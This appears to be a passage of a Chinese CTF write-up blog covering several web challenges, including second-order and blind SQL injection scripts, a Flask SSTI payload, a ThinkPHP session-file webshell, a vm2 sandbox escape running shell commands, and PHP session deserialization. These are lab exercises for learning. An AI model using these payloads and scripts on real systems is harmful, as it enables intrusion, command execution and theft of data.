class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>写入留言板的信息都被addslashes过滤了没办法突破，继续往下看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">        set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">            content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">            bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<p>发现这里的category把已经存入进去的记录直接拿出来用了，也就导致了可以二次注入（因为虽然经过addslashes的过滤，其实它进入数据库里面的格式是不变的只要它取出的时候没有再次经过过滤，就可以二次注入）</p>
<p>所以我们再写入段直接伪造一个content=执行语句然后让前面闭合就行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在write中category写入</span><br><span class="line">&#x27;,content=user(),/*					#user()处可替换成执行语句</span><br><span class="line"></span><br><span class="line">那要怎么构造闭合呢？</span><br><span class="line">可以在comment的content写入*/#</span><br><span class="line"></span><br><span class="line">他们结合起来就变成了：</span><br><span class="line">insert into comment set category = &#x27;&#x27;,content=user(),/*content = &#x27;*/#&#x27;,bo_id = &#x27;$bo_id&#x27;&quot;;</span><br><span class="line">这样就导致了前面的闭合以及后面的注释，而中间的content就是我们可以控制的了</span><br></pre></td></tr></table></figure>

<p>发现</p>
<p><img src="/2022/04/09/Comment/3.png" alt="1"></p>
<p>居然是root权限</p>
<p>可以直接加载文件，先看看系统命令在哪<code>load_file(&#39;/etc/passwd&#39;)</code></p>
<p><img src="/2022/04/09/Comment/4.png" alt="1"></p>
<p>发现在/home/www/这里，直接读历史记录<code>load_file(&#39;/home/www/.bash_history&#39;)</code></p>
<p><img src="/2022/04/09/Comment/5.png" alt="1"></p>
<p>发现他删除了<code>.DS_Store</code></p>
<p>我们知道，他只是删除，而没有释放，这里的缓存文件里面还是有这个文件的，我们只需要访问’/tmp/html/.DS_Store’就能看到这个被删掉的文件内容</p>
<p>发现有回显，但是显示不全用hex编码一下，拿到里面的内容</p>
<p><img src="/2022/04/09/Comment/6.png" alt="1"></p>
<p>然后访问web目录下的这个文件</p>
<p>然后解码它就可以拿到flag</p>
]]></content>
      <tags>
        <tag>网鼎杯2018</tag>
      </tags>
  </entry>
  <entry>
    <title>Double-Secret</title>
    <url>/2022/04/10/Double-Secret/</url>
    <content><![CDATA[<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome To Find Secret</span><br></pre></td></tr></table></figure>

<p>找到了robots.txt完全没有有用的信息</p>
<p>最后发现了secret路由</p>
<p>进去之后页面提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tell me your secret.I will encrypt it so others can&#x27;t see</span><br></pre></td></tr></table></figure>

<p>哈哈结合题目的意思，应该是get传一个参数她会进行加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当我们输入1的时候返回了d</span><br><span class="line">123 =》 d]</span><br><span class="line">123123</span><br><span class="line">报错了</span><br></pre></td></tr></table></figure>

<p>返回了一些源码信息</p>
<p><img src="/2022/04/10/Double-Secret/1.png" alt="1"></p>
<p>可以看到我们的数据会经过RC4解密，而且他给出了他的key</p>
<p>我们可以直接去解密网站上面直接解密或者是用别人的脚本</p>
<p>因为这种传入参数的题目一般就集中解法，sql，rce，flask</p>
<p>这题显然就是flask了，直接用通用payload对她进行RC4加密即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>直接搜索目录进行os调用就行</p>
<p>发现加密之后有很多不可见字符，所以需要url编码一下</p>
<p><img src="/2022/04/10/Double-Secret/2.png" alt="1"></p>
<p>找到flag直接读取即可</p>
]]></content>
      <tags>
        <tag>CISCN2019</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF-Ezsqli</title>
    <url>/2022/04/09/GYCTF-Ezsqli/</url>
    <content><![CDATA[<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>进去就是输入框输入后发现是以get方式传入id处存在注入</p>
<p>发现输入0,1,2的回显不同，直接用if构造就可以了</p>
<p>直接用一个二分法修改一下就行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line">url = <span class="string">&quot;http://ed13184f-b49d-4497-aafa-9e2addce4251.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>( <span class="literal">True</span> ):</span><br><span class="line">	i = i + <span class="number">1</span> </span><br><span class="line">	head=<span class="number">32</span></span><br><span class="line">	tail=<span class="number">127</span></span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">while</span>( head &lt; tail ):</span><br><span class="line">		mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr((select database()),%d,1))&gt;%d,1,2)&quot; % (i , mid)</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr((select group_concat(table_name)from(sys.schema_table_statistics_with_buffer)where(table_schema=database())),%d))&gt;%d,1,2)&quot; % (i , mid)</span></span><br><span class="line">		payload =  <span class="string">&quot;if(ascii(substr((select(flag)from(f1ag_1s_h3r3_hhhhh)),%d,1))&gt;%d,1,2)&quot;</span> % (i, mid)</span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">&quot;id&quot;</span>: payload</span><br><span class="line">				&#125;</span><br><span class="line">		r = requests.post(url,data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> in r.text:</span><br><span class="line">			head = mid + <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			tail = mid</span><br><span class="line">	</span><br><span class="line">	last = result</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">		result += chr(head)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>这里查数据的时候应该要无列名注入的，爆出了库也可以直接猜字段就是flag</p>
<p>无列名注入看的别的师傅们的wp：</p>
<p>我这边直接用flag测的，可以直接用</p>
]]></content>
      <tags>
        <tag>GYCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>EasyThinking</title>
    <url>/2022/04/10/EasyThinking/</url>
    <content><![CDATA[<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>在url页面玩了一阵子，发现了<a class="link" href="http://www.zip/">www.zip<i class="fas fa-external-link-alt"></i></a></p>
<p>而且他是</p>
<p><img src="/2022/04/10/EasyThinking/1.png" alt="1"></p>
<p>发现它使用ThinkPHP框架的，版本号是6.0.0而这个版本存在任意文件写入</p>
<p>主要是在session处</p>
<p>然后再看一下下载的源码：</p>
<p>简单来说主要就是当我们的PHPSESSID的值为32的时候他就会当作文件名</p>
<p>而在源码中在登录的时候调用到了session也就是说我们在将cookie改成我们自己知道的文件名那么他就会在/tmp/sess_文件名</p>
<p>创建一个文件，这样我们就可以访问到他了，那么怎么写入数据呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (Request::isPost())&#123;</span><br><span class="line">           <span class="keyword">if</span> (!session(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">return</span> redirect(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">           &#125;</span><br><span class="line">           <span class="variable">$data</span> = input(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">           <span class="variable">$record</span> = session(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (!session(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">           &#123;</span><br><span class="line">               session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">               <span class="variable">$recordArr</span> = explode(<span class="string">&quot;,&quot;</span>,<span class="variable">$record</span>);</span><br><span class="line">               <span class="variable">$recordLen</span> = sizeof(<span class="variable">$recordArr</span>);</span><br><span class="line">               <span class="keyword">if</span> (<span class="variable">$recordLen</span> &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                   array_shift(<span class="variable">$recordArr</span>);</span><br><span class="line">                   session(<span class="string">&quot;Record&quot;</span>,implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$recordArr</span>) . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                   <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">           session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$record</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">           <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> View(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>发现在search路由里面有一个session的保存会将我们输入的东西存储到文件中</p>
<p>那么我们可以直接在search页面抓包修改cookie以及提交我们的php一句话</p>
<p>先看看phpinfo有没有什么信息把</p>
<p><img src="/2022/04/10/EasyThinking/4.png" alt="1"></p>
<p>发现她过滤了很多函数，</p>
<p>可以写个一句话然后蚁剑工具bypass</p>
<p><img src="/2022/04/10/EasyThinking/3.png" alt="1"></p>
<p><img src="/2022/04/10/EasyThinking/2.png" alt="1"></p>
<p>执行readflag文件拿到flag</p>
]]></content>
      <tags>
        <tag>GYCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF2019-SQLi</title>
    <url>/2022/04/10/NCTF2019-SQLi/</url>
    <content><![CDATA[<p>听名字就知道，是sql注入</p>
<p>而且题目里面给出了搜索语句，想必他的waf一定很强大吧</p>
<p>再看看</p>
<p>在robots.txt里面发现藏了hint.txt</p>
<p>发现他的waf以及判断条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>

<p>只需要我们拿到admin账号的密码即可，但是admin被过滤了，但是想到他们肯定在一张表里面</p>
<p>空格可以用/**/注释来绕过，最后的单引号可以用未被转义的%00来截断，所以不能在url里面直接填，可以用python脚本里面的unquote来避免他被转义</p>
<p>可以用<code>\</code>来注释掉前面的东西然后将后面的passwd连接起来即可，or被过滤了，可以用<code>||</code>连接，因为判断直接就是在一张表里面，肯定是用盲注的手法，找到了一个未过滤的regexp（正则匹配）</p>
<p>regexp常用的匹配：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^a 表示以a开头</span><br><span class="line">a$ 表示以a结尾</span><br><span class="line">| 连接不同的搜索条件</span><br><span class="line">[] 多个搜索条件#[a-d]||[abcd]</span><br></pre></td></tr></table></figure>

<p>那么我们可以使用开头判断，如果正确她会有不同回显自己先试了一下看了下回显</p>
<p>发现在正确的时候她会进入一个404页面</p>
<p><img src="/2022/04/10/NCTF2019-SQLi/1.png" alt="1"></p>
<p>应该是跳转页面了，那么直接写脚本判断是否有这个报错就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse </span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://00acf249-e652-45fd-a478-7071f5fb0e1b.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">string = string.ascii_lowercase+string.digits+<span class="string">&#x27;_&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">	<span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">		data = &#123;</span><br><span class="line">		<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result+j,parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">				&#125;</span><br><span class="line">		<span class="built_in">print</span>(result+j)</span><br><span class="line">		io = requests.post(url,data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">in</span> io.text:</span><br><span class="line">			result += j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> j==<span class="string">&#x27;_&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> io.text:</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>判断条件就是最后一位为_</p>
<p>直接输入密码就能拿到flag</p>
]]></content>
      <tags>
        <tag>NCTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF2020-JustEscape</title>
    <url>/2022/04/11/HFCTF2020-JustEscape/</url>
    <content><![CDATA[<p>进入页面不难看到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;code&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看似是一个php页面，但是之前的index页面有提示：</p>
<p><img src="/2022/04/11/HFCTF2020-JustEscape/1.png" alt="1"></p>
<p>擦测他应该不是php，而且eval再nodejs中也有</p>
<p>检测一下是否是nodejs</p>
<p><img src="/2022/04/11/HFCTF2020-JustEscape/2.png" alt="1"></p>
<p>果然是nodejs，这一部分还没怎么学，先记录一下，等以后学到了再翻出来看看把</p>
<p>发现是vm2库的，看了一下，是一个不可靠的沙盒，上网找了找有直接现成的payload再github上面可以直接拿过来修改一下过滤直接打</p>
<p>因为没怎么看过所以就先直接打一下，等日后学到了再重新做一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>因为有过滤，所以直接用拼接的方式打的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">拼接：</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&#x27;open/System/Applications/Calculator.app/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">requite(<span class="string">&quot;child_process&quot;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">&#x27;open/System/Applications/Calculator.app/&#x27;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>HFCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>Strongest</title>
    <url>/2022/04/13/Strongest/</url>
    <content><![CDATA[<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>页面直接就是让我们抓取其中数据输入然后经过一千次检验之后拿到flag</p>
<p>因为用requests会重置，而且不能错，算错也重置</p>
<p>可以用selenium库来实现自动化测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">firefox = webdriver.Firefox()</span><br><span class="line">url = <span class="string">&quot;http://e61e9d17-6d5e-4c15-86a8-e69cacfebb55.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">firefox.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1010</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    result = firefox.find_element(By.XPATH, <span class="string">&#x27;/html/body/center&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    info = result.text</span><br><span class="line">    <span class="built_in">print</span>(info)</span><br><span class="line"></span><br><span class="line">    number = re.findall(<span class="string">&quot;\d+&quot;</span>, info)    <span class="comment"># 输出结果为列表</span></span><br><span class="line">    <span class="built_in">print</span>(number)</span><br><span class="line"></span><br><span class="line">    left = number[<span class="number">1</span>]</span><br><span class="line">    right = number[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(left)</span><br><span class="line">    <span class="built_in">print</span>(right)</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> info:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            flag = <span class="built_in">int</span>(left) + <span class="built_in">int</span>(right)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            flag = <span class="built_in">int</span>(left) - <span class="built_in">int</span>(right)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="comment"># 模拟输入</span></span><br><span class="line">    res_input = firefox.find_element(By.CLASS_NAME, <span class="string">&#x27;form-control&#x27;</span>)</span><br><span class="line">    res_input.send_keys(flag)</span><br><span class="line"></span><br><span class="line">    res_input.send_keys(Keys.ENTER) <span class="comment">#回车键Enter</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>GXYCTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>bestphp&#39;s-revenge</title>
    <url>/2022/04/11/bestphp-s-revenge/</url>
    <content><![CDATA[<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p>看懂了他的原理所以记录一下，日后复现的时候可以看看有什么差漏。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(reset(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125;</span><br></pre></td></tr></table></figure>

<p>扫到目录flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>

<p>就猜测应该是需要用ssrf了</p>
<p>因为没有其他的利用点，应该就是利用session反序列化，序列化与反序列化引擎的差别导致的反序列化漏洞</p>
<p>php引擎格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name|s:5:&quot;Smi1e&quot;;</span><br><span class="line"></span><br><span class="line">key|序列化value</span><br></pre></td></tr></table></figure>

<p>php_serialize引擎格式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;Smi1e&quot;;&#125;</span><br><span class="line">全序列化</span><br></pre></td></tr></table></figure>

<p>这样就导致了反序列化注入的漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如，如果我们输入的是</span><br><span class="line">$_SESSION[&#x27;abcd&#x27;]=&#x27;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#x27;;</span><br><span class="line">序列化是按照php_serialize引擎来执行的就应该是</span><br><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</span><br><span class="line">而反序列化是按照php来执行，那么前面的a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;就会被当作key后面的被当成了内容</span><br></pre></td></tr></table></figure>

<p>将session_handler的序列化引擎改变，这样|分隔符后面的内容就被当做是经过序列化之后的内容会进行一次反序列化这样就能够完成一次反序列化的攻击</p>
<p>那么该怎么利用这个漏洞呢</p>
<p>可以利用<code>call_user_func后面的参数可控</code>然后我们呢将题目中的引擎改变构造出</p>
<p>session_start(array(‘serialize_handler’=&gt;’php_serialize’))</p>
<p>也就相当于将其中的引擎</p>
<p><strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。这个特性也引入了一个新的 php.ini 设置（session.lazy_write）</strong></p>
<p>然后再name处添加我们的<code>|exp</code></p>
